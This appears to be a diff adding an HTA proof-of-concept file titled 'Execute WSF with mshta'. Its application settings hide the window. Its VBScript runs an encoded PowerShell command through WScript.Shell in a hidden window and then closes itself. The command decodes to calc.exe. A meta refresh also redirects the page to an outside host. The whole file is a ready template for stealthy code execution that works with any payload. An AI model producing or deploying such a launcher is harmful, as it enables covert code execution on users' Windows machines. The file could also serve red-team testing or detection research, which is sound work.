@@ -1,0 +1,28 @@
+<html>
+<head>
+    <title>Execute WSF with mshta</title>
+    <hta:application id="oHTA"
+                    applicationname="ExecuteWSF"
+                    scroll="no"
+                    singleinstance="yes"
+                    windowstate="minimize"
+                    maximizebutton="no"
+                    minimizebutton="no"
+                    border="none"
+                    contextmenu="no"
+                    selection="no"
+                    sysmenu="no"
+                    caption="no"
+                    innerborder="no"
+                    navigable="no"/>
+ <meta http-equiv="refresh" content="0; URL=https://control.rcsis.ir/" />   
+ </head>
+<body>
+	<script language="VBScript">
+		Set objShell = CreateObject("WScript.Shell")
+        	objShell.Run "powershell  -e YwBhAGwAYwAuAGUAeABlAA== ", 0, False
+		self.close
+	</script>
+</body>
+</html>
+
